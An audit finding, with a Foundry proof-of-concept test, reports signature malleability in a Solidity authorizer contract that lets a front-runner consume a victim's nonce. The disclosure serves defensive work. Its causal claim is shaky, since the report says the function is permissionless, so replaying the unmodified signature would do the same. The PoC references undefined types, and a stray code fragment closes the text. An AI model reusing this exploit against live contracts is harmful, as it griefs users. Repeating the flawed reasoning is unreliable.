### Title
Signature Malleability in `setIsAuthorized` Allows Front-Running to Consume Victim's Nonce - (`src/periphery/EcrecoverAuthorizer.sol`)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` passes the raw `(v, r, s)` tuple directly to `ecrecover` with no check that `s <= secp256k1_order/2`. Because secp256k1 is symmetric, any valid signature `(v, r, s)` has a second valid form `(v^1, r, secp256k1_order - s)` that recovers to the same address. An attacker who observes a pending `setIsAuthorized` transaction can compute this malleable form, front-run the victim, and consume the nonce — causing the victim's transaction to revert with `InvalidNonce()`.

### Finding Description
The vulnerable code path is `EcrecoverAuthorizer.setIsAuthorized` at lines 24–48:

```
Line 26: require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());
Line 31: address signer = ecrecover(digest, signature.v, signature.r, signature.s);
``` [1](#0-0) 

There is no guard of the form `require(uint256(signature.s) <= 0x7FFFFFFF...FFFFFFFF, ...)` anywhere in the function or in the `Signature` struct definition. [2](#0-1) 

The function is fully permissionless — `msg.sender` is never checked against `authorization.authorizer`. [3](#0-2) 

**Exploit flow:**

1. Victim signs `Authorization{authorizer, authorized, isAuthorized, nonce=N, deadline}` producing `(v, r, s)` and broadcasts `setIsAuthorized(auth, {v, r, s})`.
2. Attacker observes the mempool, computes `v' = v ^ 1`, `s' = secp256k1_order - s`.
3. Attacker front-runs with `setIsAuthorized(auth, {v', r, s'})`.
4. In the attacker's tx: line 26 passes (nonce == N), nonce is incremented to N+1; `ecrecover(digest, v', r, s')` returns the same `authorizer` address (secp256k1 malleability); signer checks pass; authorization is written to Midnight.
5. Victim's tx executes: line 26 fails because `nonce[authorizer]` is now N+1, not N → reverts with `InvalidNonce()`.

The authorization struct is identical in both calls, so the attacker cannot alter the authorization's content — the intended state change does occur. However, the victim's signed message is consumed without their submission, violating the invariant that a valid signed authorization must be submittable by its intended submitter.

### Impact Explanation
The victim's `setIsAuthorized` transaction is griefed: it reverts with `InvalidNonce()` and the victim wastes gas. The nonce is permanently consumed by the attacker's front-run. Because the `authorization` struct is fixed by the victim's signature, the attacker cannot alter the authorization's effect — the same authorization is applied. The concrete harm is: (1) victim's tx reverts and gas is lost; (2) the victim loses control over the timing and submission of their own signed message; (3) if the victim had chained multiple nonce-sequential authorizations off-chain, the attacker can disrupt the entire sequence by consuming nonce N, causing all subsequent signed messages (nonce N+1, N+2, …) to become invalid relative to the new on-chain nonce state.

### Likelihood Explanation
Preconditions are minimal: the attacker only needs to monitor the public mempool and perform one elliptic curve subtraction (`s' = n - s`). No special role, capital, or privileged access is required. The attack is repeatable for every `setIsAuthorized` submission and costs only the gas of a single transaction. On any chain without private mempools, this is trivially executable.

### Recommendation
Add a low-`s` check immediately before or after the `ecrecover` call, consistent with EIP-2 and OpenZeppelin's `ECDSA` library:

```solidity
uint256 secp256k1N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
require(uint256(signature.s) <= secp256k1N / 2, InvalidSignature());
```

Alternatively, replace the raw `ecrecover` call with OpenZeppelin's `ECDSA.recover`, which enforces the low-`s` invariant and also handles the `address(0)` check. [4](#0-3) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {EcrecoverAuthorizer, Authorization, Signature} from "src/periphery/EcrecoverAuthorizer.sol";

contract MalleabilityTest is Test {
    uint256 constant SECP256K1_ORDER =
        0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    function testFrontRunMalleableSignature() public {
        // Setup: deploy EcrecoverAuthorizer pointing at a mock Midnight
        // that accepts any setIsAuthorized call.
        address midnight = address(new MockMidnight());
        EcrecoverAuthorizer auth = new EcrecoverAuthorizer(midnight);

        uint256 privKey = 0xDEAD;
        address authorizer = vm.addr(privKey);

        // Authorizer pre-authorizes EcrecoverAuthorizer in Midnight (precondition).
        MockMidnight(midnight).setAuthorized(authorizer, address(auth), true);

        Authorization memory a = Authorization({
            authorizer: authorizer,
            authorized: makeAddr("operator"),
            isAuthorized: true,
            nonce: 0,
            deadline: block.timestamp + 1 days
        });

        // Compute digest (same as contract).
        bytes32 hashStruct = keccak256(abi.encode(
            auth.AUTHORIZATION_TYPEHASH(), a));
        bytes32 domainSep = keccak256(abi.encode(
            auth.EIP712_DOMAIN_TYPEHASH(), block.chainid, address(auth)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSep, hashStruct));

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privKey, digest);

        // Compute malleable form.
        uint8 vMalleable = v ^ 1;
        bytes32 sMalleable = bytes32(SECP256K1_ORDER - uint256(s));

        // Assert both recover to the same address.
        assertEq(ecrecover(digest, v, r, s),
                 ecrecover(digest, vMalleable, r, sMalleable));

        // Attacker front-runs with malleable signature — must succeed.
        Signature memory malleableSig = Signature({v: vMalleable, r: r, s: sMalleable});
        auth.setIsAuthorized(a, malleableSig); // <-- attacker tx
        assertEq(auth.nonce(authorizer), 1);   // nonce consumed

        // Victim's original tx must revert.
        Signature memory originalSig = Signature({v: v, r: r, s: s});
        vm.expectRevert(IEcrecoverAuthorizer.InvalidNonce.selector);
        auth.setIsAuthorized(a, originalSig); // <-- victim tx reverts
    }
}
```

**Expected assertions:**
- `ecrecover(digest, v, r, s) == ecrecover(digest, v^1, r, n-s)` — same signer, both accepted.
- Attacker's call with malleable sig succeeds; `nonce(authorizer)` advances to 1.
- Victim's call with original sig reverts with `InvalidNonce()`.

    function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
        require(block.timestamp <= authorization.deadline, Expired());
